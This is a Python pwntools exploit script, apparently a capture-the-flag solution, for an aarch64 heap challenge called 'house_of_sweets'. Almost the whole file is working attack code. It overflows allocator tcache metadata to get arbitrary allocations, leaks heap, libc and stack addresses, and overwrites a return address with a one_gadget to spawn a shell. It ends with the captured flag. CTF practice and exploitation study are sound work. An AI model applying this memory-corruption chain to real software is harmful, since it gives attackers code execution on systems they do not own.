"""
nc 35.242.184.54 1337
"""
from pwn import *
import time
import ctypes


DEBUG = True
DEBUG = False


context.update(arch="aarch64", os="linux", bits=64)


def create_cake_classic(size):
    io.sendafter("Leave", "1\n")
    io.recvuntil("appetite")
    io.send("1\n")
    io.send("1\n")
    io.send("0\n")
    io.send(str(size) + "\n")

def create_cake_hipster(size):
    io.sendafter("Leave", "1\n")
    io.recvuntil("appetite")
    io.send("1\n")
    io.send("2\n")
    io.sendafter("cake?", str(size) + "\n")

def modify_cake(idx, content):
    io.sendafter("Leave", "1\n")
    io.recvuntil("appetite")
    io.send("2\n")
    io.sendafter("modify?", str(idx)+"\n")
    io.sendafter("ingredients?", str(len(content))+"\n")
    io.send(content)

def bake_cake(idx):
    io.sendafter("Leave", "1\n")
    io.recvuntil("appetite")
    io.send("3\n")
    io.sendafter("bake?", str(idx)+"\n")
    r = io.recvuntil("What")
    r = r[r.find('...\n') + 4:].split('\nWhat')[0]
    return r

def free_cake(idx):
    io.sendafter("Leave", "1\n")
    io.recvuntil("appetite")
    io.send("4\n")
    io.sendafter("(Idx)", str(idx)+"\n")

def create_selfie_modern(size):
    io.sendafter("Leave", "2\n")
    io.recvuntil("Nevermind")
    io.send("1\n")
    io.send("2\n")
    io.send(str(size)+"\n")

def selfie_overwrite_tcache(ncached):
    """
    index for selfie should always be the value of `overflow_count`
    """
    io.sendafter("Leave", "2\n")
    io.recvuntil("Nevermind")
    io.send("2\n")
    io.sendafter("edit?", str(overflow_count)+"\n")

    """
    struct tcache_bin_s {
        tcache_bin_stats_t tstats;
        int     low_water;  /* Min # cached since last GC. */
        unsigned    lg_fill_div;    /* Fill (ncached_max >> lg_fill_div). */
        unsigned    ncached;    /* # of cached objects. */
        /*
         * To make use of adjacent cacheline prefetch, the items in the avail
         * stack goes to higher address for newer allocations.  avail points
         * just above the available space, which means that
         * avail[-ncached, ... -1] are available items and the lowest item will
         * be allocated first.
         */
        void        **avail;    /* Stack of available objects. */
    };
    """
    tstats = p64(0)
    low_water = p32(0xffffffff)
    lg_fill_div = p32(1)
    ncached = p32(ncached)  # this is the value we modify to adjust the bin `avail`
    padding = p32(0)

    tbin = tstats + low_water + lg_fill_div + ncached + padding

    """
    struct tcache_s {
        ql_elm(tcache_t) link;      /* Used for aggregating stats. */
        uint64_t    prof_accumbytes;/* Cleared after arena_prof_accum(). */
        ticker_t    gc_ticker;  /* Drives incremental GC. */
        szind_t     next_gc_bin;    /* Next bin to GC. */
        tcache_bin_t    tbins[1];   /* Dynamically sized. */
        /*
         * The pointer stacks associated with tbins follow as a contiguous
         * array.  During tcache initialization, the avail pointer in each
         * element of tbins is initialized to point to the proper offset within
         * this array.
         */
    };
    """
    link = p64(0) + p64(0)
    prof_accumbytes = p64(0)
    gc_ticker = p64(0x50)   # set this to high so flushing doesn't occur
    next_gc_bin = p32(0)    # next is self unless we care in the future
    padding = p32(0)        # probably padding, didn't verify

    tcache  = link + prof_accumbytes + gc_ticker + next_gc_bin + padding
    tcache += tbin

    buf  = "B"*(overflow_size - len(tcache)) + tcache

    io.sendafter("edit?", str(len(buf))+"\n")
    io.send(buf)


if __name__ == "__main__":
    elf = ELF("./house_of_sweets")
    if DEBUG:
        # cleanup previous runs
        os.system('adb shell "rm /data/local/tmp/socket*"')

        io = process(["adb", "shell", "/data/local/tmp/house_of_sweets"])
        sleep(1)

        # running gdbserver via adb shell
        cmd = """adb shell '/data/local/tmp/gdbserver --once --remote-debug :8888  --attach `pidof house_of_sweets`' >/dev/null 2>/dev/null &"""
        #cmd = """adb shell '/data/local/tmp/gdbserver --once --remote-debug :8888  --attach `pidof house_of_sweets`' >/dev/null &"""
        os.system(cmd)

        # attach in another window with:
        #   gdb-multiarch -x hos.gdb ./house_of_sweets
    else:
        io = remote("35.242.184.54", 1337)

        r = io.recvline()
        challenge = r.rstrip('\n').split(' ')[-1]
        response = subprocess.check_output(['hashcash', '-mqb28', challenge])
        io.send(response)
        print("Finished challenge")
        io.recvuntil("What")



    ### Overflow tcache
    overflow_size = 0x1c00
    overflow_count = 9

    # populate 0x1c00 regions until 1 before our overflow
    for i in range(overflow_count):
        create_selfie_modern(overflow_size)

    # cause a new tcache to form with cake 0
    create_cake_classic(0x100)

    # create a selfie to overflow into the new cake tcache
    create_selfie_modern(overflow_size)

    # overwrite selfie to confirm first entry (size 0x8) size (ncached) to 0
    selfie_overwrite_tcache(0)

    # populate the 0x8 bin
    create_cake_classic(0x8)
    free_cake(1)



    ### Heap leak + malloc() control
    cake1_offset = 0x10510 / 8

    # pop last cake from tcache bin in cake 1, decrements ncached to 3
    create_cake_classic(0x8)

    # set ncached back to 4, probably not needed for this but this allows us to mimic a double free
    selfie_overwrite_tcache(4)

    # pop last cake again into cake 2
    create_cake_classic(0x8)

    # set ncached to point to one below our first cake
    #   - when a value is free'd it will be pushed into our first cake
    selfie_overwrite_tcache(cake1_offset - 1)

    # free cake 2, pushing its address into cake 1
    free_cake(2)

    # leak heap with cake 1
    leak = bake_cake(1)
    leak += '\x00'*(8-len(leak))
    heap_leak = u64(leak)
    print("Heap leak: " + hex(heap_leak))



    ### Libc leak
    libc_leak_address = heap_leak - 0x40e8

    # set cake 1 to next `address - 1` byte
    modify_cake(1, p64(libc_leak_address - 1))

    # create cake 2 which will point to the leak
    create_cake_classic(0x8)

    # edit ncache to point to cake 1
    selfie_overwrite_tcache(cake1_offset)

    # set cake 1 to be `address - 8` to overwrite the NULL byte at `address - 1`
    modify_cake(1, p64(libc_leak_address - 8))

    # create hipster cake 3 to overwrite values (classic cake forces a NULL byte at last index)
    create_cake_hipster(0x8)

    # overwrite NULL byte
    modify_cake(3, "A"*8)

    # display cake 2 to leak libc pointer
    leak = bake_cake(2)

    # trim off the overwritten NULL byte
    leak = leak[1:]
    leak += '\x00'*(8-len(leak))
    libc_leak = u64(leak)
    libc_base = libc_leak - 0x91420
    one_gadget = libc_base + 0x662C4
    print("Libc leak: " + hex(libc_leak))
    print("Libc base: " + hex(libc_base))
    print("One gadget: " + hex(one_gadget))



    ### Stack leak
    environ_address = libc_base + 0xC6008

    # revert ncached 
    selfie_overwrite_tcache(cake1_offset)

    # set cake 1 to `address - 1`
    modify_cake(1, p64(environ_address - 1))

    # create cake 4 at address environ - 1
    create_cake_classic(0x8)

    # revert ncached
    selfie_overwrite_tcache(cake1_offset)

    # set cake 1 to `address - 8`
    modify_cake(1, p64(environ_address - 8))

    # create cake 5 at address environ - 8
    create_cake_hipster(0x8)

    # overwrite NULL byte
    modify_cake(5, "A"*8)

    # display cake 4 to leak environ stack pointer
    leak = bake_cake(4)

    # trim off the overwritten NULL byte
    leak = leak[1:]
    leak += '\x00'*(8-len(leak))
    environ_leak = u64(leak)
    print("Environ leak: " + hex(environ_leak))



    ### Overwrite do_sweets() return to main
    ret_to_main = environ_leak - 0xd0

    # revert ncached
    selfie_overwrite_tcache(cake1_offset)

    # set cake 1 to address to write
    modify_cake(1, p64(ret_to_main))

    # allocate cake 6
    create_cake_hipster(0x8)

    # overwrite return address
    modify_cake(6, p64(one_gadget))

    # return to one gadget and spawn shell
    io.interactive()
    io.close()
"""
$ cat /data/local/tmp/flag
SaF{I_th1nk_1Ts_7h3_3xp3cTA7I0nS_4nd_As5uMp7I0n5_0f_0tH3r5_7hAT_c4u5E_H3ar74ch3}
"""